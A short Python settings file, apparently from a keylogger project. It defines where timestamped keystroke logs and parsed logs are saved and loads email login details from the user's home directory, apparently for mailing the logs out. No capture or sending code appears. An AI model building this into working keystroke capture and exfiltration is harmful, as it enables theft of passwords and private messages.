import datetime
import os
import getpass
import glob
import configparser

WRITE_KEYLOG_OUTPATH = 'logs/keylogs/keylog_outputs/'
WRITE_KEYLOG_FILENAME =  'keylog_' + str(datetime.datetime.today()).replace(' ', '_') + '.txt'

##### parse keylogged params #####

READ_KEYLOGGED_DIR = WRITE_KEYLOG_OUTPATH
WRITE_KEYLOGGED_DIR = 'keylogs/keylogs_parsed/'

##### email params #####

EMAIL_LOGIN_INFO = configparser.ConfigParser()
EMAIL_LOGIN_INFO.read('/home/{}/email_login_info.ini'.format(getpass.getuser()))

KEYLOG_FILES = glob.glob('./{}/*.py'.format(WRITE_KEYLOG_OUTPATH))
